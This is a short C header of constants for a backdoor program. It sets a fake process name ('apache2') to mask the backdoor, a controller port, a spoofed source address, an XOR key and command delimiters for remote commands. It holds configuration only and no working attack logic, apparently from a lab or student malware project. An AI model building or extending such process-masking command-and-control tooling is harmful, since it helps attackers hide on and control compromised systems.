#ifndef CONSTANTS_H
#define CONSTANTS_H

// The process name to use when masking the backdoor process
static const char* NEW_PROCESS_NAME = "apache2";

// The server port the controller uses to listen for responses
static const int SERVER_PORT = 42069;
// The source address to use when sending response back
static const char *SOURCE_ADDR = "192.168.75.75";


// The key to use for XOR encryption
static const char *XOR_KEY = "key";


// The header and footer of the command string
static const char* COMMAND_START = "start[";
static const char* COMMAND_END = "]end";
// The maximum size of a command the backdoor supports
static const int MAX_COMMAND_LEN = 1024;

#endif
